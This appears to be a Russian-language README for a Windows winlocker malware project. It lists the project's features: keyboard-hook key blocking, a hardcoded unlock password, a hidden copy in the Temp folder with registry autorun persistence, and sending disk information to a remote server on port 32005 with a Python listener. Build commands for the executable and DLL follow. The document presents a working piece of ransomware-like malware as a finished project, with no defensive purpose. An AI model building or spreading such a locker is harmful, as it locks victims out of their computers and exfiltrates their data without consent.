# simple-winlocker

Простейший винлокер на виндовс с отправкой на удаленный сервер информацию о дисках (сделан через DLL)
<br><br>
Было реализовано:

0) Реализован исполняемый файл для подгрузки DLL
1) Реализована блокировка системных клавиш, кроме цифр, клавиши Enter и BackSpace при помощи системной ловушки
2) Разблокировка винлокера при помощи пароля 314159
3) Создание скрытого потока, хранящегося в папке Temp с именем kostikmakostik и загружающегося каждый раз при входе в систему (запись в реестр)
4) Передача по порту 32005 информации о дисках на удаленный сервер
5) start_listen.py - файл, хранящийся на удаленном сервере, слушает информацию, пришедшую по этому порту
<br><br>

Компиляция:
<br><br>
g++ -o kostikmakostik.exe kostikmakostik.cpp -lws2_32 -mwindows -DUNICODE -D_UNICODE
<br>
PAUSE
<br><br>
windres WinLockerDLL.rc -o WinLockerDLL.o
<br>
PAUSE
<br>
g++ -shared -o WinLockerDLL.dll WinLockerDLL.cpp WinLockerDLL.o -lws2_32 -luser32 -lgdi32 -Wl,--subsystem,windows -DUNICODE -D_UNICODE
<br>
PAUSE
<br><br>
g++ -DUNICODE -D_UNICODE -DWIN32 -D_WINDOWS -o 1.exe 1.cpp -mwindows
<br>
1.exe
<br>
PAUSE